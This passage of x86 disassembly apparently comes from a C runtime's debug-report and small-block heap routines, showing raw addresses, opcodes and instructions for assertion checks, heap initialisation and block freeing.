  407011:	ff 15 48 f2 45 00    	call   *0x45f248
  407017:	83 c4 08             	add    $0x8,%esp
  40701a:	eb 0c                	jmp    0x407028
  40701c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40701f:	50                   	push   %eax
  407020:	e8 0b 01 00 00       	call   0x407130
  407025:	83 c4 04             	add    $0x4,%esp
  407028:	e9 a1 00 00 00       	jmp    0x4070ce
  40702d:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407030:	83 79 14 01          	cmpl   $0x1,0x14(%ecx)
  407034:	75 3d                	jne    0x407073
  407036:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  407039:	8b 42 10             	mov    0x10(%edx),%eax
  40703c:	50                   	push   %eax
  40703d:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407040:	83 c1 20             	add    $0x20,%ecx
  407043:	51                   	push   %ecx
  407044:	68 c0 f9 40 00       	push   $0x40f9c0
  407049:	6a 00                	push   $0x0
  40704b:	6a 00                	push   $0x0
  40704d:	6a 00                	push   $0x0
  40704f:	6a 00                	push   $0x0
  407051:	e8 6a 25 00 00       	call   0x4095c0
  407056:	83 c4 1c             	add    $0x1c,%esp
  407059:	83 f8 01             	cmp    $0x1,%eax
  40705c:	75 01                	jne    0x40705f
  40705e:	cc                   	int3
  40705f:	33 d2                	xor    %edx,%edx
  407061:	85 d2                	test   %edx,%edx
  407063:	75 d1                	jne    0x407036
  407065:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407068:	50                   	push   %eax
  407069:	e8 c2 00 00 00       	call   0x407130
  40706e:	83 c4 04             	add    $0x4,%esp
  407071:	eb 5b                	jmp    0x4070ce
  407073:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  407076:	8b 51 14             	mov    0x14(%ecx),%edx
  407079:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  40707f:	83 fa 02             	cmp    $0x2,%edx
  407082:	75 4a                	jne    0x4070ce
  407084:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407087:	8b 48 10             	mov    0x10(%eax),%ecx
  40708a:	51                   	push   %ecx
  40708b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40708e:	8b 42 14             	mov    0x14(%edx),%eax
  407091:	c1 f8 10             	sar    $0x10,%eax
  407094:	25 ff ff 00 00       	and    $0xffff,%eax
  407099:	50                   	push   %eax
  40709a:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40709d:	83 c1 20             	add    $0x20,%ecx
  4070a0:	51                   	push   %ecx
  4070a1:	68 8c f9 40 00       	push   $0x40f98c
  4070a6:	6a 00                	push   $0x0
  4070a8:	6a 00                	push   $0x0
  4070aa:	6a 00                	push   $0x0
  4070ac:	6a 00                	push   $0x0
  4070ae:	e8 0d 25 00 00       	call   0x4095c0
  4070b3:	83 c4 20             	add    $0x20,%esp
  4070b6:	83 f8 01             	cmp    $0x1,%eax
  4070b9:	75 01                	jne    0x4070bc
  4070bb:	cc                   	int3
  4070bc:	33 d2                	xor    %edx,%edx
  4070be:	85 d2                	test   %edx,%edx
  4070c0:	75 c2                	jne    0x407084
  4070c2:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4070c5:	50                   	push   %eax
  4070c6:	e8 65 00 00 00       	call   0x407130
  4070cb:	83 c4 04             	add    $0x4,%esp
  4070ce:	e9 d6 fd ff ff       	jmp    0x406ea9
  4070d3:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4070da:	e8 02 00 00 00       	call   0x4070e1
  4070df:	eb 0b                	jmp    0x4070ec
  4070e1:	6a 09                	push   $0x9
  4070e3:	e8 28 c4 ff ff       	call   0x403510
  4070e8:	83 c4 04             	add    $0x4,%esp
  4070eb:	c3                   	ret
  4070ec:	68 74 f9 40 00       	push   $0x40f974
  4070f1:	68 e4 f5 40 00       	push   $0x40f5e4
  4070f6:	6a 00                	push   $0x0
  4070f8:	6a 00                	push   $0x0
  4070fa:	6a 00                	push   $0x0
  4070fc:	6a 00                	push   $0x0
  4070fe:	e8 bd 24 00 00       	call   0x4095c0
  407103:	83 c4 18             	add    $0x18,%esp
  407106:	83 f8 01             	cmp    $0x1,%eax
  407109:	75 01                	jne    0x40710c
  40710b:	cc                   	int3
  40710c:	33 c9                	xor    %ecx,%ecx
  40710e:	85 c9                	test   %ecx,%ecx
  407110:	75 da                	jne    0x4070ec
  407112:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407115:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40711c:	5f                   	pop    %edi
  40711d:	5e                   	pop    %esi
  40711e:	5b                   	pop    %ebx
  40711f:	8b e5                	mov    %ebp,%esp
  407121:	5d                   	pop    %ebp
  407122:	c3                   	ret
  407123:	cc                   	int3
  407124:	cc                   	int3
  407125:	cc                   	int3
  407126:	cc                   	int3
  407127:	cc                   	int3
  407128:	cc                   	int3
  407129:	cc                   	int3
  40712a:	cc                   	int3
  40712b:	cc                   	int3
  40712c:	cc                   	int3
  40712d:	cc                   	int3
  40712e:	cc                   	int3
  40712f:	cc                   	int3
  407130:	55                   	push   %ebp
  407131:	8b ec                	mov    %esp,%ebp
  407133:	83 ec 5c             	sub    $0x5c,%esp
  407136:	53                   	push   %ebx
  407137:	56                   	push   %esi
  407138:	57                   	push   %edi
  407139:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  407140:	eb 09                	jmp    0x40714b
  407142:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  407145:	83 c0 01             	add    $0x1,%eax
  407148:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40714b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40714e:	83 79 10 10          	cmpl   $0x10,0x10(%ecx)
  407152:	7d 0b                	jge    0x40715f
  407154:	8b 55 08             	mov    0x8(%ebp),%edx
  407157:	8b 42 10             	mov    0x10(%edx),%eax
  40715a:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40715d:	eb 07                	jmp    0x407166
  40715f:	c7 45 ac 10 00 00 00 	movl   $0x10,-0x54(%ebp)
  407166:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  407169:	3b 4d ac             	cmp    -0x54(%ebp),%ecx
  40716c:	0f 8d 9a 00 00 00    	jge    0x40720c
  407172:	8b 55 08             	mov    0x8(%ebp),%edx
  407175:	03 55 b4             	add    -0x4c(%ebp),%edx
  407178:	8a 42 20             	mov    0x20(%edx),%al
  40717b:	88 45 b0             	mov    %al,-0x50(%ebp)
  40717e:	83 3d 10 d5 45 00 01 	cmpl   $0x1,0x45d510
  407185:	7e 1c                	jle    0x4071a3
  407187:	68 57 01 00 00       	push   $0x157
  40718c:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  40718f:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  407195:	51                   	push   %ecx
  407196:	e8 25 43 00 00       	call   0x40b4c0
  40719b:	83 c4 08             	add    $0x8,%esp
  40719e:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4071a1:	eb 1d                	jmp    0x4071c0
  4071a3:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4071a6:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4071ac:	a1 04 d3 45 00       	mov    0x45d304,%eax
  4071b1:	33 c9                	xor    %ecx,%ecx
  4071b3:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  4071b7:	81 e1 57 01 00 00    	and    $0x157,%ecx
  4071bd:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  4071c0:	83 7d a8 00          	cmpl   $0x0,-0x58(%ebp)
  4071c4:	74 0e                	je     0x4071d4
  4071c6:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4071c9:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4071cf:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  4071d2:	eb 07                	jmp    0x4071db
  4071d4:	c7 45 a4 20 00 00 00 	movl   $0x20,-0x5c(%ebp)
  4071db:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4071de:	8a 4d a4             	mov    -0x5c(%ebp),%cl
  4071e1:	88 4c 05 b8          	mov    %cl,-0x48(%ebp,%eax,1)
  4071e5:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4071e8:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4071ee:	52                   	push   %edx
  4071ef:	68 74 fa 40 00       	push   $0x40fa74
  4071f4:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  4071f7:	6b c0 03             	imul   $0x3,%eax,%eax
  4071fa:	8d 4c 05 cc          	lea    -0x34(%ebp,%eax,1),%ecx
  4071fe:	51                   	push   %ecx
  4071ff:	e8 bc 41 00 00       	call   0x40b3c0
  407204:	83 c4 0c             	add    $0xc,%esp
  407207:	e9 36 ff ff ff       	jmp    0x407142
  40720c:	8b 55 b4             	mov    -0x4c(%ebp),%edx
  40720f:	c6 44 15 b8 00       	movb   $0x0,-0x48(%ebp,%edx,1)
  407214:	8d 45 cc             	lea    -0x34(%ebp),%eax
  407217:	50                   	push   %eax
  407218:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40721b:	51                   	push   %ecx
  40721c:	68 64 fa 40 00       	push   $0x40fa64
  407221:	6a 00                	push   $0x0
  407223:	6a 00                	push   $0x0
  407225:	6a 00                	push   $0x0
  407227:	6a 00                	push   $0x0
  407229:	e8 92 23 00 00       	call   0x4095c0
  40722e:	83 c4 1c             	add    $0x1c,%esp
  407231:	83 f8 01             	cmp    $0x1,%eax
  407234:	75 01                	jne    0x407237
  407236:	cc                   	int3
  407237:	33 d2                	xor    %edx,%edx
  407239:	85 d2                	test   %edx,%edx
  40723b:	75 d7                	jne    0x407214
  40723d:	5f                   	pop    %edi
  40723e:	5e                   	pop    %esi
  40723f:	5b                   	pop    %ebx
  407240:	8b e5                	mov    %ebp,%esp
  407242:	5d                   	pop    %ebp
  407243:	c3                   	ret
  407244:	cc                   	int3
  407245:	cc                   	int3
  407246:	cc                   	int3
  407247:	cc                   	int3
  407248:	cc                   	int3
  407249:	cc                   	int3
  40724a:	cc                   	int3
  40724b:	cc                   	int3
  40724c:	cc                   	int3
  40724d:	cc                   	int3
  40724e:	cc                   	int3
  40724f:	cc                   	int3
  407250:	55                   	push   %ebp
  407251:	8b ec                	mov    %esp,%ebp
  407253:	83 ec 34             	sub    $0x34,%esp
  407256:	53                   	push   %ebx
  407257:	56                   	push   %esi
  407258:	57                   	push   %edi
  407259:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40725c:	50                   	push   %eax
  40725d:	e8 1e fa ff ff       	call   0x406c80
  407262:	83 c4 04             	add    $0x4,%esp
  407265:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  407269:	75 19                	jne    0x407284
  40726b:	83 7d d4 00          	cmpl   $0x0,-0x2c(%ebp)
  40726f:	75 13                	jne    0x407284
  407271:	8b 0d 88 b1 45 00    	mov    0x45b188,%ecx
  407277:	83 e1 10             	and    $0x10,%ecx
  40727a:	85 c9                	test   %ecx,%ecx
  40727c:	74 3d                	je     0x4072bb
  40727e:	83 7d d8 00          	cmpl   $0x0,-0x28(%ebp)
  407282:	74 37                	je     0x4072bb
  407284:	68 7c fa 40 00       	push   $0x40fa7c
  407289:	68 e4 f5 40 00       	push   $0x40f5e4
  40728e:	6a 00                	push   $0x0
  407290:	6a 00                	push   $0x0
  407292:	6a 00                	push   $0x0
  407294:	6a 00                	push   $0x0
  407296:	e8 25 23 00 00       	call   0x4095c0
  40729b:	83 c4 18             	add    $0x18,%esp
  40729e:	83 f8 01             	cmp    $0x1,%eax
  4072a1:	75 01                	jne    0x4072a4
  4072a3:	cc                   	int3
  4072a4:	33 d2                	xor    %edx,%edx
  4072a6:	85 d2                	test   %edx,%edx
  4072a8:	75 da                	jne    0x407284
  4072aa:	6a 00                	push   $0x0
  4072ac:	e8 7f fb ff ff       	call   0x406e30
  4072b1:	83 c4 04             	add    $0x4,%esp
  4072b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4072b9:	eb 02                	jmp    0x4072bd
  4072bb:	33 c0                	xor    %eax,%eax
  4072bd:	5f                   	pop    %edi
  4072be:	5e                   	pop    %esi
  4072bf:	5b                   	pop    %ebx
  4072c0:	8b e5                	mov    %ebp,%esp
  4072c2:	5d                   	pop    %ebp
  4072c3:	c3                   	ret
  4072c4:	cc                   	int3
  4072c5:	cc                   	int3
  4072c6:	cc                   	int3
  4072c7:	cc                   	int3
  4072c8:	cc                   	int3
  4072c9:	cc                   	int3
  4072ca:	cc                   	int3
  4072cb:	cc                   	int3
  4072cc:	cc                   	int3
  4072cd:	cc                   	int3
  4072ce:	cc                   	int3
  4072cf:	cc                   	int3
  4072d0:	55                   	push   %ebp
  4072d1:	8b ec                	mov    %esp,%ebp
  4072d3:	68 40 01 00 00       	push   $0x140
  4072d8:	6a 00                	push   $0x0
  4072da:	a1 4c f2 45 00       	mov    0x45f24c,%eax
  4072df:	50                   	push   %eax
  4072e0:	ff 15 b0 f0 40 00    	call   *0x40f0b0
  4072e6:	a3 40 f2 45 00       	mov    %eax,0x45f240
  4072eb:	83 3d 40 f2 45 00 00 	cmpl   $0x0,0x45f240
  4072f2:	75 04                	jne    0x4072f8
  4072f4:	33 c0                	xor    %eax,%eax
  4072f6:	eb 38                	jmp    0x407330
  4072f8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4072fb:	89 0d 44 f2 45 00    	mov    %ecx,0x45f244
  407301:	8b 15 40 f2 45 00    	mov    0x45f240,%edx
  407307:	89 15 34 f2 45 00    	mov    %edx,0x45f234
  40730d:	c7 05 38 f2 45 00 00 	movl   $0x0,0x45f238
  407314:	00 00 00 
  407317:	c7 05 3c f2 45 00 00 	movl   $0x0,0x45f23c
  40731e:	00 00 00 
  407321:	c7 05 2c f2 45 00 10 	movl   $0x10,0x45f22c
  407328:	00 00 00 
  40732b:	b8 01 00 00 00       	mov    $0x1,%eax
  407330:	5d                   	pop    %ebp
  407331:	c3                   	ret
  407332:	cc                   	int3
  407333:	cc                   	int3
  407334:	cc                   	int3
  407335:	cc                   	int3
  407336:	cc                   	int3
  407337:	cc                   	int3
  407338:	cc                   	int3
  407339:	cc                   	int3
  40733a:	cc                   	int3
  40733b:	cc                   	int3
  40733c:	cc                   	int3
  40733d:	cc                   	int3
  40733e:	cc                   	int3
  40733f:	cc                   	int3
  407340:	55                   	push   %ebp
  407341:	8b ec                	mov    %esp,%ebp
  407343:	83 ec 0c             	sub    $0xc,%esp
  407346:	a1 3c f2 45 00       	mov    0x45f23c,%eax
  40734b:	6b c0 14             	imul   $0x14,%eax,%eax
  40734e:	8b 0d 40 f2 45 00    	mov    0x45f240,%ecx
  407354:	03 c8                	add    %eax,%ecx
  407356:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  407359:	8b 15 40 f2 45 00    	mov    0x45f240,%edx
  40735f:	89 55 f8             	mov    %edx,-0x8(%ebp)
  407362:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407365:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  407368:	73 25                	jae    0x40738f
  40736a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40736d:	8b 55 08             	mov    0x8(%ebp),%edx
  407370:	2b 51 0c             	sub    0xc(%ecx),%edx
  407373:	89 55 fc             	mov    %edx,-0x4(%ebp)
  407376:	81 7d fc 00 00 10 00 	cmpl   $0x100000,-0x4(%ebp)
  40737d:	73 05                	jae    0x407384
  40737f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407382:	eb 0d                	jmp    0x407391
  407384:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407387:	83 c0 14             	add    $0x14,%eax
  40738a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40738d:	eb d3                	jmp    0x407362
  40738f:	33 c0                	xor    %eax,%eax
  407391:	8b e5                	mov    %ebp,%esp
  407393:	5d                   	pop    %ebp
  407394:	c3                   	ret
  407395:	cc                   	int3
  407396:	cc                   	int3
  407397:	cc                   	int3
  407398:	cc                   	int3
  407399:	cc                   	int3
  40739a:	cc                   	int3
  40739b:	cc                   	int3
  40739c:	cc                   	int3
  40739d:	cc                   	int3
  40739e:	cc                   	int3
  40739f:	cc                   	int3
  4073a0:	55                   	push   %ebp
  4073a1:	8b ec                	mov    %esp,%ebp
  4073a3:	83 ec 0c             	sub    $0xc,%esp
  4073a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4073a9:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4073ac:	2b 48 0c             	sub    0xc(%eax),%ecx
  4073af:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4073b2:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4073b5:	c1 ea 0f             	shr    $0xf,%edx
  4073b8:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4073bb:	b8 00 00 00 80       	mov    $0x80000000,%eax
  4073c0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4073c3:	d3 e8                	shr    %cl,%eax
  4073c5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4073c8:	8b 51 08             	mov    0x8(%ecx),%edx
  4073cb:	23 d0                	and    %eax,%edx
  4073cd:	85 d2                	test   %edx,%edx
  4073cf:	75 20                	jne    0x4073f1
  4073d1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4073d4:	83 e0 0f             	and    $0xf,%eax
  4073d7:	85 c0                	test   %eax,%eax
  4073d9:	75 16                	jne    0x4073f1
  4073db:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4073de:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  4073e4:	85 c9                	test   %ecx,%ecx
  4073e6:	74 09                	je     0x4073f1
  4073e8:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  4073ef:	eb 07                	jmp    0x4073f8
  4073f1:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  4073f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4073fb:	8b e5                	mov    %ebp,%esp
  4073fd:	5d                   	pop    %ebp
  4073fe:	c3                   	ret
  4073ff:	cc                   	int3
  407400:	55                   	push   %ebp
  407401:	8b ec                	mov    %esp,%ebp
  407403:	83 ec 3c             	sub    $0x3c,%esp
  407406:	8b 45 08             	mov    0x8(%ebp),%eax
  407409:	8b 48 10             	mov    0x10(%eax),%ecx
  40740c:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  40740f:	8b 55 08             	mov    0x8(%ebp),%edx
  407412:	8b 45 0c             	mov    0xc(%ebp),%eax
  407415:	2b 42 0c             	sub    0xc(%edx),%eax
  407418:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40741b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40741e:	c1 e9 0f             	shr    $0xf,%ecx
  407421:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  407424:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407427:	69 d2 04 02 00 00    	imul   $0x204,%edx,%edx
  40742d:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  407430:	8d 8c 10 44 01 00 00 	lea    0x144(%eax,%edx,1),%ecx
  407437:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40743a:	8b 55 0c             	mov    0xc(%ebp),%edx
  40743d:	83 ea 04             	sub    $0x4,%edx
  407440:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  407443:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407446:	8b 08                	mov    (%eax),%ecx
  407448:	83 e9 01             	sub    $0x1,%ecx
  40744b:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40744e:	8b 55 d0             	mov    -0x30(%ebp),%edx
  407451:	83 e2 01             	and    $0x1,%edx
  407454:	85 d2                	test   %edx,%edx
  407456:	74 05                	je     0x40745d
  407458:	e9 7b 05 00 00       	jmp    0x4079d8
  40745d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407460:	03 45 d0             	add    -0x30(%ebp),%eax
  407463:	89 45 c8             	mov    %eax,-0x38(%ebp)
  407466:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407469:	8b 11                	mov    (%ecx),%edx
  40746b:	89 55 ec             	mov    %edx,-0x14(%ebp)
  40746e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407471:	8b 48 fc             	mov    -0x4(%eax),%ecx
  407474:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  407477:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40747a:	83 e2 01             	and    $0x1,%edx
  40747d:	85 d2                	test   %edx,%edx
  40747f:	0f 85 22 01 00 00    	jne    0x4075a7
  407485:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407488:	c1 f8 04             	sar    $0x4,%eax
  40748b:	83 e8 01             	sub    $0x1,%eax
  40748e:	89 45 dc             	mov    %eax,-0x24(%ebp)
  407491:	83 7d dc 3f          	cmpl   $0x3f,-0x24(%ebp)
  407495:	76 07                	jbe    0x40749e
  407497:	c7 45 dc 3f 00 00 00 	movl   $0x3f,-0x24(%ebp)
  40749e:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4074a1:	8b 55 c8             	mov    -0x38(%ebp),%edx
  4074a4:	8b 41 04             	mov    0x4(%ecx),%eax
  4074a7:	3b 42 08             	cmp    0x8(%edx),%eax
  4074aa:	0f 85 d0 00 00 00    	jne    0x407580
  4074b0:	83 7d dc 20          	cmpl   $0x20,-0x24(%ebp)
  4074b4:	73 5f                	jae    0x407515
  4074b6:	ba 00 00 00 80       	mov    $0x80000000,%edx
  4074bb:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4074be:	d3 ea                	shr    %cl,%edx
  4074c0:	f7 d2                	not    %edx
  4074c2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4074c5:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4074c8:	8b 44 81 44          	mov    0x44(%ecx,%eax,4),%eax
  4074cc:	23 c2                	and    %edx,%eax
  4074ce:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4074d1:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4074d4:	89 44 8a 44          	mov    %eax,0x44(%edx,%ecx,4)
  4074d8:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4074db:	03 45 dc             	add    -0x24(%ebp),%eax
  4074de:	8a 48 04             	mov    0x4(%eax),%cl
  4074e1:	80 e9 01             	sub    $0x1,%cl
  4074e4:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4074e7:	03 55 dc             	add    -0x24(%ebp),%edx
  4074ea:	88 4a 04             	mov    %cl,0x4(%edx)
  4074ed:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4074f0:	03 45 dc             	add    -0x24(%ebp),%eax
  4074f3:	0f be 48 04          	movsbl 0x4(%eax),%ecx
  4074f7:	85 c9                	test   %ecx,%ecx
  4074f9:	75 18                	jne    0x407513
  4074fb:	ba 00 00 00 80       	mov    $0x80000000,%edx
  407500:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407503:	d3 ea                	shr    %cl,%edx
  407505:	f7 d2                	not    %edx
  407507:	8b 45 08             	mov    0x8(%ebp),%eax
  40750a:	8b 08                	mov    (%eax),%ecx
  40750c:	23 ca                	and    %edx,%ecx
  40750e:	8b 55 08             	mov    0x8(%ebp),%edx
  407511:	89 0a                	mov    %ecx,(%edx)
  407513:	eb 6b                	jmp    0x407580
  407515:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407518:	83 e9 20             	sub    $0x20,%ecx
  40751b:	b8 00 00 00 80       	mov    $0x80000000,%eax
  407520:	d3 e8                	shr    %cl,%eax
  407522:	f7 d0                	not    %eax
  407524:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407527:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40752a:	8b 8c 8a c4 00 00 00 	mov    0xc4(%edx,%ecx,4),%ecx
  407531:	23 c8                	and    %eax,%ecx
  407533:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407536:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  407539:	89 8c 90 c4 00 00 00 	mov    %ecx,0xc4(%eax,%edx,4)
  407540:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  407543:	03 4d dc             	add    -0x24(%ebp),%ecx
  407546:	8a 51 04             	mov    0x4(%ecx),%dl
  407549:	80 ea 01             	sub    $0x1,%dl
  40754c:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40754f:	03 45 dc             	add    -0x24(%ebp),%eax
  407552:	88 50 04             	mov    %dl,0x4(%eax)
  407555:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  407558:	03 4d dc             	add    -0x24(%ebp),%ecx
  40755b:	0f be 51 04          	movsbl 0x4(%ecx),%edx
  40755f:	85 d2                	test   %edx,%edx
  407561:	75 1d                	jne    0x407580
  407563:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  407566:	83 e9 20             	sub    $0x20,%ecx
  407569:	b8 00 00 00 80       	mov    $0x80000000,%eax
  40756e:	d3 e8                	shr    %cl,%eax
  407570:	f7 d0                	not    %eax
  407572:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407575:	8b 51 04             	mov    0x4(%ecx),%edx
  407578:	23 d0                	and    %eax,%edx
  40757a:	8b 45 08             	mov    0x8(%ebp),%eax
  40757d:	89 50 04             	mov    %edx,0x4(%eax)
  407580:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407583:	8b 51 08             	mov    0x8(%ecx),%edx
  407586:	8b 45 c8             	mov    -0x38(%ebp),%eax
  407589:	8b 48 04             	mov    0x4(%eax),%ecx
  40758c:	89 4a 04             	mov    %ecx,0x4(%edx)
  40758f:	8b 55 c8             	mov    -0x38(%ebp),%edx
  407592:	8b 42 04             	mov    0x4(%edx),%eax
  407595:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407598:	8b 51 08             	mov    0x8(%ecx),%edx
  40759b:	89 50 08             	mov    %edx,0x8(%eax)
  40759e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4075a1:	03 45 ec             	add    -0x14(%ebp),%eax
  4075a4:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4075a7:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4075aa:	c1 f9 04             	sar    $0x4,%ecx
  4075ad:	83 e9 01             	sub    $0x1,%ecx
  4075b0:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4075b3:	83 7d d8 3f          	cmpl   $0x3f,-0x28(%ebp)
  4075b7:	76 07                	jbe    0x4075c0
  4075b9:	c7 45 d8 3f 00 00 00 	movl   $0x3f,-0x28(%ebp)
  4075c0:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4075c3:	83 e2 01             	and    $0x1,%edx
  4075c6:	85 d2                	test   %edx,%edx
  4075c8:	0f 85 56 01 00 00    	jne    0x407724
  4075ce:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4075d1:	2b 45 f4             	sub    -0xc(%ebp),%eax
  4075d4:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4075d7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4075da:	c1 f9 04             	sar    $0x4,%ecx
  4075dd:	83 e9 01             	sub    $0x1,%ecx
  4075e0:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  4075e3:	83 7d d4 3f          	cmpl   $0x3f,-0x2c(%ebp)
  4075e7:	76 07                	jbe    0x4075f0
  4075e9:	c7 45 d4 3f 00 00 00 	movl   $0x3f,-0x2c(%ebp)
  4075f0:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4075f3:	03 55 f4             	add    -0xc(%ebp),%edx
  4075f6:	89 55 d0             	mov    %edx,-0x30(%ebp)
  4075f9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4075fc:	c1 f8 04             	sar    $0x4,%eax
  4075ff:	83 e8 01             	sub    $0x1,%eax
  407602:	89 45 d8             	mov    %eax,-0x28(%ebp)
  407605:	83 7d d8 3f          	cmpl   $0x3f,-0x28(%ebp)
  407609:	76 07                	jbe    0x407612
  40760b:	c7 45 d8 3f 00 00 00 	movl   $0x3f,-0x28(%ebp)
  407612:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  407615:	3b 4d d8             	cmp    -0x28(%ebp),%ecx
  407618:	0f 84 00 01 00 00    	je     0x40771e
  40761e:	8b 55 cc             	mov    -0x34(%ebp),%edx
  407621:	8b 45 cc             	mov    -0x34(%ebp),%eax
  407624:	8b 4a 04             	mov    0x4(%edx),%ecx
  407627:	3b 48 08             	cmp    0x8(%eax),%ecx
  40762a:	0f 85 d0 00 00 00    	jne    0x407700
  407630:	83 7d d4 20          	cmpl   $0x20,-0x2c(%ebp)
  407634:	73 5f                	jae    0x407695
  407636:	ba 00 00 00 80       	mov    $0x80000000,%edx
  40763b:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40763e:	d3 ea                	shr    %cl,%edx
  407640:	f7 d2                	not    %edx
  407642:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407645:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  407648:	8b 44 81 44          	mov    0x44(%ecx,%eax,4),%eax
  40764c:	23 c2                	and    %edx,%eax
  40764e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407651:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  407654:	89 44 8a 44          	mov    %eax,0x44(%edx,%ecx,4)
  407658:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40765b:	03 45 d4             	add    -0x2c(%ebp),%eax
  40765e:	8a 48 04             	mov    0x4(%eax),%cl
  407661:	80 e9 01             	sub    $0x1,%cl
  407664:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  407667:	03 55 d4             	add    -0x2c(%ebp),%edx
